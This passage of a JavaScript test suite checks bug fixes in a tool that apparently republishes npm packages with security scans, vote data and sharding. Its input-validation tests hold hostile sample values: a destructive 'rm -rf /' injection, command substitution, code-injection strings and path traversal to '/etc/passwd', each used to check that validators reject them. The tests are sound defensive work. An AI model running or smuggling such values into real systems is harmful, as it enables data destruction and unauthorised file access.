        delete process.env.SHARD_TOTAL;
      } else {
        process.env.SHARD_TOTAL = originalTotal;
      }
    });

    it('should export sleep as an async function', async () => {
      const { sleep } = await import('../utilities.mjs');

      expect(typeof sleep).toBe('function');

      const start = Date.now();
      await sleep(10);
      const elapsed = Date.now() - start;

      expect(elapsed).toBeGreaterThanOrEqual(5);
    });
  });

  describe('tryInstallMethods tuple format', () => {
    it('should accept command-args tuples not plain strings', () => {
      // This validates the fix for the critical bug where installTestDeps
      // passed strings like 'npm install' instead of ['npm', ['install']]
      const methods = [
        ['npm', ['install']],
        ['npm', ['install', '--legacy-peer-deps']],
        ['npm', ['install', '--force', '--ignore-scripts']],
      ];

      for (const [command, commandArguments] of methods) {
        expect(typeof command).toBe('string');
        expect(Array.isArray(commandArguments)).toBe(true);
        expect(commandArguments.every((a) => typeof a === 'string')).toBe(true);
      }

      // Verify string destructuring would fail (the old bug)
      const badMethods = ['npm install', 'npm install --legacy-peer-deps'];
      for (const method of badMethods) {
        const [command, commandArguments] = method;

        // String destructuring gives individual characters
        expect(command).toBe('n');
        expect(commandArguments).toBe('p');
      }
    });
  });

  describe('semver.coerce for version cleaning', () => {
    it('should handle range specifiers that regex cannot', async () => {
      const semverModule = await import('semver');
      const semverInstance = semverModule.default || semverModule;

      // Old code: currentVersion.replace(/^[\^~]/u, '') would leave these broken
      const rangeSpecifiers = [
        '>=1.0.0',
        '>2.0.0',
        '1.x',
        '1.2.x',
        '~1.0.0',
        '^1.0.0',
      ];

      for (const spec of rangeSpecifiers) {
        const coerced = semverInstance.coerce(spec);

        expect(coerced).not.toBeNull();
        expect(semverInstance.valid(coerced.version)).toBeTruthy();
      }

      // Old regex only stripped ^ and ~ -- these would have failed semver.gt()
      const oldRegex = /^[\^~]/u;

      expect('>=1.0.0'.replace(oldRegex, '')).toBe('>=1.0.0'); // NOT valid semver

      expect(semverInstance.valid('>=1.0.0')).toBeNull(); // confirms it's invalid

      expect(semverInstance.coerce('>=1.0.0')?.version).toBe('1.0.0'); // coerce works
    });
  });

  describe('advanced malware checks return value', () => {
    it('should return findings array not undefined', () => {
      // The function must return findings so the caller can check length
      // Previously returned undefined (missing return statement)
      const findings = ['test finding'];

      // Verify the caller pattern works with actual array
      expect(findings).toBeDefined();
      expect(findings.length).toBeGreaterThan(0);

      // Verify the caller pattern fails with undefined (the old bug)
      const undefinedResult = undefined;

      expect(undefinedResult && undefinedResult.length > 0).toBeFalsy();
    });
  });

  describe('printRevisionReport defensive defaults', () => {
    it('should handle missing or non-numeric vote fields', () => {
      // Simulates corrupted vote data where fields are strings or undefined
      const corruptData = {
        details: [],
        down: undefined,
        neutral: null,
        up: 'five',
      };
      const up = Number(corruptData.up) || 0;
      const down = Number(corruptData.down) || 0;
      const neutral = Number(corruptData.neutral) || 0;

      expect(up).toBe(0); // NaN from Number('five') falls through to 0
      expect(down).toBe(0);
      expect(neutral).toBe(0);

      const total = up + down + neutral;

      expect(total).toBe(0);
      expect(Number.isNaN(total)).toBe(false);
    });

    it('should guard against non-array details field', () => {
      const data = { details: 'not an array', down: 0, neutral: 0, up: 1 };

      expect(Array.isArray(data.details)).toBe(false);

      // The guard: Array.isArray(data.details) && data.details.length > 0
      const hasDetails = Array.isArray(data.details) && data.details.length > 0;

      expect(hasDetails).toBe(false);
    });
  });

  describe('artifact name sanitization for scoped packages', () => {
    it('should replace slash and at-sign for GitHub Actions artifact names', () => {
      const packages = [
        '@babel/core',
        '@nestjs/common',
        'lodash',
        '@types/node',
      ];
      const sanitized = packages.map((p) => p.replaceAll(/[/@]/gu, '_'));

      expect(sanitized).toStrictEqual([
        '_babel_core',
        '_nestjs_common',
        'lodash',
        '_types_node',
      ]);

      // Verify no slashes remain (GitHub Actions rejects these)
      for (const name of sanitized) {
        expect(name).not.toContain('/');
      }
    });
  });

  describe('isVersionCompatible with semver.coerce', () => {
    it('should use coerce for actual version and satisfies for range', async () => {
      const semverModule = await import('semver');
      const semverInstance = semverModule.default || semverModule;

      // satisfies(version, range) -- version must be clean, range can have operators
      const cleanActual = semverInstance.coerce('^2.0.0')?.version;

      expect(cleanActual).toBe('2.0.0');

      expect(semverInstance.satisfies(cleanActual, '^2.0.0')).toBe(true);

      expect(semverInstance.satisfies(cleanActual, '^3.0.0')).toBe(false);

      // Old buggy bidirectional check: satisfies(range, version) makes no sense
      // satisfies('2.0.0', '3.0.0') checks if 2.0.0 equals exactly 3.0.0
      expect(semverInstance.satisfies('2.0.0', '3.0.0')).toBe(false);
    });
  });

  describe('template injection prevention in test file generation', () => {
    it('should safely escape package names with special characters', () => {
      const dangerousNames = [
        "'; process.exit(0); '",
        '"; process.exit(0); "',
        '`; process.exit(0); `',
        '../../../etc/passwd',
        '@scope/name',
        "package'name",
      ];

      for (const name of dangerousNames) {
        const safe = JSON.stringify(name);

        // JSON.stringify always produces a double-quoted string
        expect(safe.startsWith('"')).toBe(true);
        expect(safe.endsWith('"')).toBe(true);

        // The result should be valid JavaScript when used in import()
        // Parsing the JSON back should give the original string
        expect(JSON.parse(safe)).toBe(name);
      }
    });
  });

  describe('retry backoff jitter', () => {
    it('should produce variable delays with jitter factor', () => {
      const baseDelay = 1000;
      const delays = [];

      for (let index = 0; index < 20; index++) {
        const attempt = 1;
        const delay = baseDelay * 2 ** attempt * (0.5 + Math.random());
        delays.push(delay);
      }

      // With jitter, delays should vary (not all identical)
      const uniqueDelays = new Set(delays);

      expect(uniqueDelays.size).toBeGreaterThan(1);

      // All delays should be in range [baseDelay * 2^attempt * 0.5, baseDelay * 2^attempt * 1.5]
      for (const delay of delays) {
        expect(delay).toBeGreaterThanOrEqual(baseDelay * 2 * 0.5);
        expect(delay).toBeLessThan(baseDelay * 2 * 1.5);
      }
    });
  });

  describe('integrity data type guards', () => {
    it('should handle corrupted version entries in integrity data', () => {
      const integrityData = {
        '1.0.0': 'corrupted string',
        '2.0.0': 42,
        '3.0.0': { 0: { status: 'published' } },
      };
      const baseVersion = '1.0.0';

      // The guard: typeof check before assignment
      if (
        typeof integrityData[baseVersion] !== 'object' ||
        integrityData[baseVersion] === null
      ) {
        integrityData[baseVersion] = {};
      }

      expect(typeof integrityData[baseVersion]).toBe('object');
      expect(integrityData[baseVersion]).toStrictEqual({});

      // Valid entry should remain unchanged
      expect(integrityData['3.0.0']).toStrictEqual({
        0: { status: 'published' },
      });
    });
  });

  describe('deterministic package sorting before sharding', () => {
    it('should produce same shard assignment regardless of input order', () => {
      const packagesA = [
        { name: 'express' },
        { name: 'lodash' },
        { name: 'react' },
        { name: 'axios' },
        { name: 'chalk' },
      ];
      const packagesB = [
        { name: 'chalk' },
        { name: 'react' },
        { name: 'axios' },
        { name: 'express' },
        { name: 'lodash' },
      ];

      const sortAndShard = (packages, shardIndex, shardTotal) =>
        packages
          .toSorted((a, b) => a.name.localeCompare(b.name))
          .filter((_package, index) => index % shardTotal === shardIndex);

      const shardA = sortAndShard(packagesA, 0, 3);
      const shardB = sortAndShard(packagesB, 0, 3);

      expect(shardA.map((p) => p.name)).toStrictEqual(
        shardB.map((p) => p.name),
      );
    });
  });

  describe('listScopeDirectories EACCES resilience', () => {
    it('should return empty array on directory read failure', async () => {
      // Simulate the error handling pattern used in utilities.mjs
      const listScopeDirectories = async () => {
        try {
          throw new Error('EACCES: permission denied');
        } catch {
          return [];
        }
      };

      const result = await listScopeDirectories();

      expect(result).toStrictEqual([]);
    });
  });

  describe('cli input validation', () => {
    it('should reject package names with shell injection characters', () => {
      const validator = (input) => {
        if (!input || !input.trim()) {
          return 'Package name is required';
        }
        if (/[;`$|><\\{}[\]!#%^&*()='"]/u.test(input)) {
          return 'Package name contains invalid characters';
        }
        return true;
      };

      expect(validator('express')).toBe(true);
      expect(validator('@scope/name')).toBe(true);
      expect(validator('')).toBe('Package name is required');
      expect(validator('   ')).toBe('Package name is required');
      expect(validator('pkg; rm -rf /')).toBe(
        'Package name contains invalid characters',
      );
      expect(validator("pkg'injection")).toBe(
        'Package name contains invalid characters',
      );
      expect(validator('pkg$(cmd)')).toBe(
        'Package name contains invalid characters',
      );
    });
  });

  describe('heal.mjs version filtering with semver.valid', () => {
    it('should filter out invalid version strings before semver.compare', async () => {
      const semverModule = await import('semver');
      const semverInstance = semverModule.default || semverModule;

      const directoryNames = [
        '1.0.0',
        '2.0.0',
        '1.0.0garbage',
        '3.0.0-beta.1',
        'not-a-version',
      ];

      const versions = directoryNames
        .filter((v) => /^\d+\.\d+\.\d+/u.test(v))
        .filter((v) => semverInstance.valid(v));

      // '1.0.0garbage' passes the regex but fails semver.valid()
      expect(versions).toStrictEqual(['1.0.0', '2.0.0', '3.0.0-beta.1']);

      // Now safe to sort
      const sorted = versions.toSorted((a, b) => semverInstance.compare(a, b));

      expect(sorted).toStrictEqual(['1.0.0', '2.0.0', '3.0.0-beta.1']);
    });
  });

  describe('add-package scoped package validation', () => {
    it('should reject @scope without /package', () => {
      const validatePackageName = (packageName) => {
        const nameParts = packageName.startsWith('@')
          ? packageName.slice(1).split('/')
          : [packageName];
        const validPart = /^[\w.-]+$/u;
        const isScopedWithoutName =
          packageName.startsWith('@') && nameParts.length !== 2;
        return !(
          isScopedWithoutName ||
          nameParts.length > 2 ||
          nameParts.length === 0 ||
          !nameParts.every((part) => validPart.test(part))
        );
      };

      expect(validatePackageName('@scope/package')).toBe(true);
      expect(validatePackageName('express')).toBe(true);
      expect(validatePackageName('@scope')).toBe(false);
      expect(validatePackageName('@scope/')).toBe(false);
      expect(validatePackageName('@/package')).toBe(false);
    });
  });

  describe('removePackage case-insensitive existence check', () => {
    it('should find package regardless of case', () => {
      const existingPackages = ['express', 'lodash', 'React'];
      const packageName = 'react';
      const lowerPackageName = packageName.toLowerCase();

      // Old bug: includes() is case-sensitive -- 'react' not in ['React']
      expect(existingPackages).not.toContain(packageName);

      // Fix: case-insensitive check matches removal logic
      expect(
        existingPackages.some((p) => p.toLowerCase() === lowerPackageName),
      ).toBe(true);
    });
  });

  describe('integrity-meter path traversal prevention', () => {
    it('should reject package names with path traversal', () => {
      const dangerousNames = ['../../etc', '../passwd', 'pkg/../../root'];

      for (const name of dangerousNames) {
        expect(name).toContain('..');
      }

      // Safe names should pass
      const safeNames = ['express', '@scope/name', 'my.package'];

      for (const name of safeNames) {
        expect(name).not.toContain('..');
      }
    });
  });

  describe('integrity-meter vote coercion', () => {
    it('should coerce corrupted vote counts to numbers', () => {
      const data = { details: [], down: 'corrupted', neutral: 0, up: 5 };

      // Old bug: ++  on 'corrupted' gives NaN
      const oldResult = Number.parseInt('corrupted', 10);

      expect(Number.isNaN(oldResult)).toBe(true);

      // Fix: (Number(x) || 0) + 1
      const fixed = (Number(data.down) || 0) + 1;

      expect(fixed).toBe(1);
      expect(Number.isNaN(fixed)).toBe(false);
    });
  });

  describe('generate-readme vote count lookup', () => {
    it('should sum votes across revisions for version total', () => {
      const votesData = {
        '1.0.0': {
          0: { details: [], down: 1, neutral: 0, up: 3 },
          1: { details: [], down: 0, neutral: 1, up: 2 },
        },
      };

      // Old bug: votesData['1.0.0'].totalVotes is always undefined
      expect(votesData['1.0.0'].totalVotes).toBeUndefined();

      // Fix: sum across revisions
      const versionData = votesData['1.0.0'];
      let total = 0;

      for (const revisionData of Object.values(versionData)) {
        if (typeof revisionData === 'object' && revisionData !== null) {
          total +=
            (Number(revisionData.up) || 0) +
            (Number(revisionData.down) || 0) +
            (Number(revisionData.neutral) || 0);
        }
      }

      expect(total).toBe(7);
    });
  });

  describe('unhandled promise prevention in entry points', () => {
    it('should catch async errors instead of fire-and-forget', async () => {
      let caught = false;
      const asyncMain = async () => {
        throw new Error('async failure');
      };

      // Fix pattern: try/await/catch
      try {
        await asyncMain();
      } catch {
        caught = true;
      }

      expect(caught).toBe(true);
    });
  });

  describe('installBuildDeps error handling', () => {
    it('should not throw on install failure', () => {
      // Simulates the try/catch pattern in installBuildDeps
      let caught = false;
      const installBuildDeps = () => {
        try {
          throw new Error('npm install failed');
        } catch {
          caught = true;
        }
      };

      expect(() => installBuildDeps()).not.toThrow();
      expect(caught).toBe(true);
    });
  });

  describe('epublishconflict cause chain traversal', () => {
    it('should detect EPUBLISHCONFLICT in nested cause chain', () => {
      const isAlreadyPublishedError = (error) => {
        let current = error;
        while (current) {
          const message = current.message || '';
          const stderr = current.stderr?.toString?.() || '';
          const code = current.code || '';
          const combined = `${message} ${stderr} ${code}`;
          if (
            combined.includes('EPUBLISHCONFLICT') ||
            combined.includes('cannot publish over the previously published')
          ) {
            return true;
          }
          current = current.cause;
        }
        return false;
      };

      // Direct error
      expect(isAlreadyPublishedError(new Error('EPUBLISHCONFLICT'))).toBe(true);

      // Wrapped error with cause chain depth 2
      const innerError = new Error('npm ERR! EPUBLISHCONFLICT');
      const middleError = new Error('Command failed', { cause: innerError });
      const outerError = new Error('Publish failed', { cause: middleError });

      expect(isAlreadyPublishedError(outerError)).toBe(true);

      // Non-matching error
      expect(isAlreadyPublishedError(new Error('Network timeout'))).toBe(false);

      // stderr-based detection
      const stderrError = new Error('Command failed');
      stderrError.stderr = Buffer.from(
        'You cannot publish over the previously published version',
      );

      expect(isAlreadyPublishedError(stderrError)).toBe(true);
    });
  });

  describe('compatibility analysis overwrite prevention', () => {
    it('should not overwrite existing analysis results', () => {
      // Simulates the fix in security-scan.mjs performCompatibilityAnalysis
      const results = {
        compatibility: {
          details: [{ check: 'deps', status: 'passed' }],
          status: 'passed',
          timestamp: '2026-01-01T00:00:00Z',
        },
      };

      // Old bug: unconditionally overwrote results
      // Fix: only set if still pending
      if (results.compatibility.status === 'pending') {
        results.compatibility = {
          details: [],
          status: 'passed',
          timestamp: new Date().toISOString(),
        };
      } else {
        results.compatibility.timestamp = new Date().toISOString();
      }

      // Original details should be preserved
      expect(results.compatibility.details).toHaveLength(1);
      expect(results.compatibility.details[0].check).toBe('deps');
    });
  });

  describe('npm audit JSON parse resilience', () => {
    it('should handle malformed npm audit output', () => {
      // Simulates the try/catch around JSON.parse(error.stdout) in security-scan.mjs
      const parseAuditOutput = (stdout) => {
        try {
          return JSON.parse(stdout);
        } catch {
          return null;
        }
      };

      // Valid JSON
      const valid = parseAuditOutput('{"vulnerabilities":{}}');

      expect(valid).toStrictEqual({ vulnerabilities: {} });

      // Invalid JSON (npm sometimes outputs non-JSON on errors)
      const invalid = parseAuditOutput('npm ERR! audit error');

      expect(invalid).toBeNull();

      // Empty string
      expect(parseAuditOutput('')).toBeNull();

      // Undefined (no stdout captured)
      expect(parseAuditOutput()).toBeNull();
    });
  });

  describe('scoped package name flattening', () => {
    it('should correctly flatten scoped names for depup scope', async () => {
      const { flattenPackageName, toScopedName } = await import(
        '../utilities.mjs'
      );

      // Unscoped packages pass through unchanged
      expect(flattenPackageName('express')).toBe('express');
      expect(toScopedName('express')).toBe('@depup/express');

      // Scoped packages flatten with double underscore
      expect(flattenPackageName('@nestjs/common')).toBe('nestjs__common');
      expect(toScopedName('@nestjs/common')).toBe('@depup/nestjs__common');

      // Edge: single-char scope
      expect(flattenPackageName('@a/b')).toBe('a__b');
    });
  });

  describe('non-semver specifier detection', () => {
    it('should detect all non-semver dependency formats', async () => {
      const { isNonSemverSpecifier } = await import('../utilities.mjs');

      // Non-semver formats
      expect(isNonSemverSpecifier('npm:lodash@^4.0.0')).toBe(true);
      expect(isNonSemverSpecifier('git+https://github.com/x/y.git')).toBe(true);
      expect(isNonSemverSpecifier('github:user/repo')).toBe(true);
      expect(isNonSemverSpecifier('file:../local-pkg')).toBe(true);
      expect(isNonSemverSpecifier('workspace:*')).toBe(true);
      expect(isNonSemverSpecifier('link:../other')).toBe(true);
      expect(isNonSemverSpecifier('https://example.com/pkg.tgz')).toBe(true);
      expect(isNonSemverSpecifier('http://example.com/pkg.tgz')).toBe(true);

      // Non-string inputs
      expect(isNonSemverSpecifier(null)).toBe(true);
      expect(isNonSemverSpecifier()).toBe(true);
      expect(isNonSemverSpecifier(42)).toBe(true);

      // Valid semver specifiers
      expect(isNonSemverSpecifier('^1.0.0')).toBe(false);
      expect(isNonSemverSpecifier('~2.3.0')).toBe(false);
      expect(isNonSemverSpecifier('>=1.0.0')).toBe(false);
      expect(isNonSemverSpecifier('1.0.0')).toBe(false);
      expect(isNonSemverSpecifier('*')).toBe(false);
    });
  });

  describe('shard config validation', () => {
    it('should validate shard boundaries', async () => {
      const { getShardConfig } = await import('../utilities.mjs');

      // Save original env
      const originalIndex = process.env.SHARD_INDEX;
      const originalTotal = process.env.SHARD_TOTAL;

      // Valid config
      process.env.SHARD_INDEX = '2';
      process.env.SHARD_TOTAL = '5';

      const config = getShardConfig();

      expect(config.shardIndex).toBe(2);
      expect(config.shardTotal).toBe(5);

      // Invalid: index >= total
      process.env.SHARD_INDEX = '5';
      process.env.SHARD_TOTAL = '5';

      expect(() => getShardConfig()).toThrow('Invalid shard configuration');

      // Invalid: negative index
      process.env.SHARD_INDEX = '-1';
      process.env.SHARD_TOTAL = '5';

      expect(() => getShardConfig()).toThrow('Invalid shard configuration');

      // Invalid: total < 1
      process.env.SHARD_INDEX = '0';
      process.env.SHARD_TOTAL = '0';

      expect(() => getShardConfig()).toThrow('Invalid shard configuration');

      // Restore
      if (originalIndex === undefined) {
        delete process.env.SHARD_INDEX;
      } else {
        process.env.SHARD_INDEX = originalIndex;
      }
      if (originalTotal === undefined) {
        delete process.env.SHARD_TOTAL;
      } else {
        process.env.SHARD_TOTAL = originalTotal;
      }
    });
  });

  describe('depup version tagging', () => {
    it('should use latest tag for depup versions not beta', async () => {
      const semverModule = await import('semver');
      const semver = semverModule.default;

      const version = '1.0.0-depup.0';
      const isPrerelease = semver.prerelease(version) !== null;
      const isDepupVersion =
        Array.isArray(semver.prerelease(version)) &&
        semver.prerelease(version).includes('depup');

      expect(isPrerelease).toBe(true);
      expect(isDepupVersion).toBe(true);

      // Depup versions should get 'latest' tag, not 'beta'
      const getTag = (depup, pre) => {
        if (depup) {
          return 'latest';
        }
        return pre ? 'beta' : null;
      };

      expect(getTag(isDepupVersion, isPrerelease)).toBe('latest');

      // Regular prerelease should get 'beta'
      const betaVersion = '1.0.0-beta.1';
      const isBetaPre = semver.prerelease(betaVersion) !== null;
      const isBetaDepup =
        Array.isArray(semver.prerelease(betaVersion)) &&
        semver.prerelease(betaVersion).includes('depup');
      const betaTag = getTag(isBetaDepup, isBetaPre);

      expect(betaTag).toBe('beta');
    });
  });

  describe('publish status determination', () => {
    it('should correctly determine publish status', () => {
      const getPublishStatus = (shouldPublish, published) => {
        if (!shouldPublish) {
          return 'prepared';
        }
        return published ? 'published' : 'skipped';
      };

      expect(getPublishStatus(false, false)).toBe('prepared');
      expect(getPublishStatus(false, true)).toBe('prepared');
      expect(getPublishStatus(true, true)).toBe('published');
      expect(getPublishStatus(true, false)).toBe('skipped');
    });
  });

  describe('wasRecentlyProcessed uses processedAt not mtime', () => {
    it('should detect recently processed via integrity processedAt', () => {
      // Extracted helper mirrors cron-sync getLatestProcessedAt
      const extractTime = (revisionData) => {
        if (!revisionData?.processedAt) {
          return 0;
        }
        const time = new Date(revisionData.processedAt).getTime();
        return Number.isNaN(time) ? 0 : time;
      };

      const tenMinutesAgo = new Date(Date.now() - 10 * 60_000).toISOString();
      const twoHoursAgo = new Date(Date.now() - 2 * 60 * 60_000).toISOString();
      const thirtyMinutesAgo = Date.now() - 30 * 60_000;

      expect(extractTime({ processedAt: tenMinutesAgo })).toBeGreaterThan(
        thirtyMinutesAgo,
      );

      expect(extractTime({ processedAt: twoHoursAgo })).toBeLessThan(
        thirtyMinutesAgo,
      );

      expect(extractTime(null)).toBe(0);

      expect(extractTime({ processedAt: 'Never' })).toBe(0);

      expect(extractTime({})).toBe(0);
    });

    it('should return 0 for null/non-object integrity data', () => {
      const isValidIntegrity = (data) =>
        data !== null && typeof data === 'object';

      expect(isValidIntegrity(null)).toBe(false);

      expect(isValidIntegrity('corrupted')).toBe(false);

      expect(isValidIntegrity({ '1.0.0': {} })).toBe(true);
    });
  });

  describe('corrupt integrity.json guard', () => {
    it('should skip null/non-object integrity data', () => {
      const processIntegrityData = (integrityData) => {
        if (!integrityData || typeof integrityData !== 'object') {
          return [];
        }
        return Object.keys(integrityData);
      };

      expect(processIntegrityData(null)).toStrictEqual([]);

      expect(processIntegrityData('corrupted')).toStrictEqual([]);

      expect(processIntegrityData(42)).toStrictEqual([]);

      expect(processIntegrityData({ '1.0.0': {} })).toStrictEqual(['1.0.0']);
    });
  });

  describe('latestVersion undefined guard', () => {
    it('should handle missing dist-tags.latest gracefully', () => {
      const getLatestVersion = (manifest) => manifest['dist-tags']?.latest;

      expect(getLatestVersion({})).toBeUndefined();

      expect(getLatestVersion({ 'dist-tags': {} })).toBeUndefined();

      expect(getLatestVersion({ 'dist-tags': { latest: '1.0.0' } })).toBe(
        '1.0.0',
      );

      // Packument with version but no dist-tags -- should NOT fall back
      expect(getLatestVersion({ version: '2.0.0' })).toBeUndefined();
    });
  });

  describe('semver.coerce handles version prefixes without manual strip', () => {
    it('should coerce all version prefix formats', async () => {
      const semverModule = await import('semver');
      const semver = semverModule.default;

      // semver.coerce handles all these without needing .replace()
      expect(semver.coerce('^1.2.3').version).toBe('1.2.3');

      expect(semver.coerce('~1.2.3').version).toBe('1.2.3');

      expect(semver.coerce('>=1.2.3').version).toBe('1.2.3');

      expect(semver.coerce('>1.2.3').version).toBe('1.2.3');

      expect(semver.coerce('1.x').version).toBe('1.0.0');

      expect(semver.coerce('1.2.x').version).toBe('1.2.0');
    });
  });

  describe('updateIntegrityData vote coercion', () => {
    it('should coerce all vote fields to numbers before arithmetic', () => {
      // Simulates updateIntegrityData logic
      const computeIntegrity = (voteData) => {
        const up = Number(voteData.up) || 0;
        const down = Number(voteData.down) || 0;
        const neutral = Number(voteData.neutral) || 0;
        const total = up + down + neutral;
        const score = total > 0 ? ((up - down) / total) * 100 : 0;
        return { score: Math.round(score), totalVotes: total };
      };

      // Normal case
      expect(computeIntegrity({ down: 1, neutral: 0, up: 3 })).toStrictEqual({
        score: 50,
        totalVotes: 4,
      });

      // Corrupted string values
      expect(
        computeIntegrity({ down: 0, neutral: 0, up: 'corrupted' }),
      ).toStrictEqual({
        score: 0,
        totalVotes: 0,
      });

      // Mixed corrupt/valid
      expect(
        computeIntegrity({ down: 'bad', neutral: 0, up: 2 }),
      ).toStrictEqual({
        score: 100,
        totalVotes: 2,
      });

      // All undefined
      expect(computeIntegrity({})).toStrictEqual({
        score: 0,
        totalVotes: 0,
      });
    });
  });

  describe('vote details array guard', () => {
    it('should handle corrupted details field', () => {
      const ensureDetailsArray = (entry) => {
        if (!Array.isArray(entry.details)) {
          entry.details = [];
        }
        return entry;
      };

      const nullDetails = ensureDetailsArray({ details: null, up: 0 });

      expect(Array.isArray(nullDetails.details)).toBe(true);

      const stringDetails = ensureDetailsArray({ details: 'bad', up: 0 });

      expect(Array.isArray(stringDetails.details)).toBe(true);

      // Valid array should be preserved
      const validDetails = ensureDetailsArray({ details: [{ vote: 'up' }] });

      expect(validDetails.details).toStrictEqual([{ vote: 'up' }]);
    });
  });

  describe('npm audit severity differentiation in error path', () => {
    it('should use buildVulnerabilityResult for error path too', () => {
      const buildVulnerabilityResult = (vulnerabilities) => {
        if (vulnerabilities.critical > 0 || vulnerabilities.high > 0) {
          return { status: 'failed' };
        }
        return { status: 'warning' };
      };

      // Only moderate -- should warn not fail
      expect(
        buildVulnerabilityResult({
          critical: 0,
          high: 0,
          low: 1,
          moderate: 3,
          total: 4,
        }),
      ).toStrictEqual({ status: 'warning' });

      // Has critical -- should fail
      expect(
        buildVulnerabilityResult({
          critical: 1,
          high: 0,
          low: 0,
          moderate: 0,
          total: 1,
        }),
      ).toStrictEqual({ status: 'failed' });
    });
  });

  describe('findExpectedVersion exact major match', () => {
    it('should not match major 1 against 17.x', () => {
      const findExpectedVersion = (version, versionMap) => {
        const majorVersion = version.replaceAll(/[<=>^~]/gu, '').split('.')[0];
        const key = `${majorVersion}.x`;
        return versionMap[key] || null;
      };

      const versionMap = { '17.x': '17.x', '18.x': '18.x', '19.x': '19.x' };

      // Major 18 should match 18.x
      expect(findExpectedVersion('^18.2.0', versionMap)).toBe('18.x');

      // Major 1 should NOT match 17.x (the old startsWith bug)
      expect(findExpectedVersion('^1.0.0', versionMap)).toBeNull();

      // Major 17 should match 17.x
      expect(findExpectedVersion('~17.5.0', versionMap)).toBe('17.x');
    });
  });

  describe('generateErrorReport handles .json reportPath', () => {
    it('should extract directory from .json file path', () => {
      const getErrorDirectory = (reportPath) => {
        if (reportPath.endsWith('.json')) {
          // Get parent directory (equivalent to path.dirname)
          return reportPath.slice(0, reportPath.lastIndexOf('/'));
        }
        return reportPath;
      };

      // .json file path should extract directory
      expect(getErrorDirectory('/reports/security-scan.json')).toBe('/reports');

      // Directory path should be returned as-is
      expect(getErrorDirectory('/reports')).toBe('/reports');

      // Nested .json file path
      expect(getErrorDirectory('/a/b/c/report.json')).toBe('/a/b/c');
    });
  });

  describe('legitimate dotfile allowlist', () => {
    it('should not flag common dotfiles as suspicious', () => {
      const legitimateDotfiles = new Set([
        '.babelrc',
        '.browserslistrc',
        '.editorconfig',
        '.eslintignore',
        '.eslintrc',
        '.eslintrc.json',
        '.eslintrc.js',
        '.eslintrc.yml',
        '.gitattributes',
        '.gitignore',
        '.npmignore',
        '.npmrc',
        '.nvmrc',
        '.prettierignore',
        '.prettierrc',
        '.prettierrc.json',
        '.stylelintrc',
        '.yarnrc',
      ]);

      const isSuspiciousHiddenFile = (fileName) =>
        fileName.startsWith('.') &&
        !legitimateDotfiles.has(fileName.toLowerCase());

      // Legitimate dotfiles should NOT be flagged
      expect(isSuspiciousHiddenFile('.npmrc')).toBe(false);

      expect(isSuspiciousHiddenFile('.gitignore')).toBe(false);

      expect(isSuspiciousHiddenFile('.eslintrc.json')).toBe(false);

      // Truly suspicious hidden files SHOULD be flagged
      expect(isSuspiciousHiddenFile('.malicious-script')).toBe(true);

      expect(isSuspiciousHiddenFile('.hidden-payload')).toBe(true);
    });
  });

  describe('compatibility analysis skipped status', () => {
    it('should report skipped when no package.json exists', () => {
      const getCompatibilityStatus = (packageJsonExists) => {
        if (!packageJsonExists) {
          return {
            details: [
              'No package.json found -- compatibility analysis skipped',
            ],
            status: 'skipped',
          };
        }
        return { details: ['Analysis completed'], status: 'passed' };
      };

      expect(getCompatibilityStatus(false).status).toBe('skipped');

      expect(getCompatibilityStatus(true).status).toBe('passed');
    });
  });

  describe('security attestation tracks completed scans', () => {
    it('should report not-run for skipped scans and passed for completed', () => {
      const completedScans = {
        compatibility: false,
        malware: true,
        vulnerability: true,
      };

      const getStatus = (scanType) =>
        completedScans[scanType] ? 'passed' : 'not-run';

      expect(getStatus('malware')).toBe('passed');

      expect(getStatus('vulnerability')).toBe('passed');

      expect(getStatus('compatibility')).toBe('not-run');
    });
  });

  describe('runInSandbox does not JSON.parse stdout', () => {
    it('should not attempt to parse non-JSON output', () => {
      // depup.mjs outputs human-readable text, not JSON
      const humanReadableOutput =
        'Processing express...\nDone! Published @depup/express@4.18.2-depup.0';

      // The old code did JSON.parse(result) which would always fail
      expect(() => JSON.parse(humanReadableOutput)).toThrow('Unexpected token');

      // The fix: runInSandbox no longer returns parsed JSON
      // Just verify the stdout is not valid JSON (confirming the bug existed)
      let isJson = true;
      try {
        JSON.parse(humanReadableOutput);
      } catch {
        isJson = false;
      }

      expect(isJson).toBe(false);
    });
  });

  describe('cron-sync dedup uses timestamp field', () => {
    const extractTimestamp = (revisionData) => {
      if (
        !revisionData ||
        typeof revisionData !== 'object' ||
        !revisionData.timestamp
      ) {
        return 0;
      }
      const time = new Date(revisionData.timestamp).getTime();
      return Number.isNaN(time) ? 0 : time;
    };

    it('should read timestamp not processedAt from integrity data', () => {
      // Data with 'timestamp' field (what depup.mjs actually writes)
      const validEntry = {
        status: 'published',
        timestamp: '2026-03-14T12:00:00.000Z',
      };

      expect(extractTimestamp(validEntry)).toBeGreaterThan(0);

      // Data with 'processedAt' field (wrong field name -- old bug)
      const wrongFieldEntry = {
        processedAt: '2026-03-14T12:00:00.000Z',
        status: 'published',
      };

      // Should return 0 because 'timestamp' field doesn't exist
      expect(extractTimestamp(wrongFieldEntry)).toBe(0);

      // Null/undefined/non-object should return 0
      expect(extractTimestamp(null)).toBe(0);

      expect(extractTimestamp('bad')).toBe(0);
    });
  });

  describe('integrity-meter blocks absolute path traversal', () => {
    it('should reject absolute paths in package names', () => {
      const path = { isAbsolute: (p) => p.startsWith('/') };

      const isValid = (packageName) =>
        !packageName.includes('..') && !path.isAbsolute(packageName);

      expect(isValid('express')).toBe(true);

      expect(isValid('@babel/core')).toBe(true);

      expect(isValid('../etc/passwd')).toBe(false);

      expect(isValid('/etc/passwd')).toBe(false);

      expect(isValid('/tmp')).toBe(false);
    });
  });

  describe('cron-discover uses in operator for version check', () => {
    it('should detect null/falsy integrity entries with in operator', () => {
      const integrityData = {
        '1.0.0': null,
        '2.0.0': { 0: { status: 'published' } },
        '3.0.0': 0,
      };

      // Truthiness check fails for null/0 entries
      expect(Boolean(integrityData['1.0.0'])).toBe(false);

      expect(Boolean(integrityData['3.0.0'])).toBe(false);

      // `in` operator correctly detects the key exists
      expect('1.0.0' in integrityData).toBe(true);

      expect('2.0.0' in integrityData).toBe(true);

      expect('3.0.0' in integrityData).toBe(true);

      // Missing version correctly returns false
      expect('4.0.0' in integrityData).toBe(false);
    });
  });

  describe('generate-readme guards non-object version entry', () => {
    it('should reject null/non-object integrity version data', () => {
      const checkVersionEntry = (entry) => {
        if (typeof entry !== 'object' || entry === null) {
          return 'corrupt';
        }
        return 'valid';
      };

      expect(checkVersionEntry(null)).toBe('corrupt');

      expect(checkVersionEntry('bad')).toBe('corrupt');

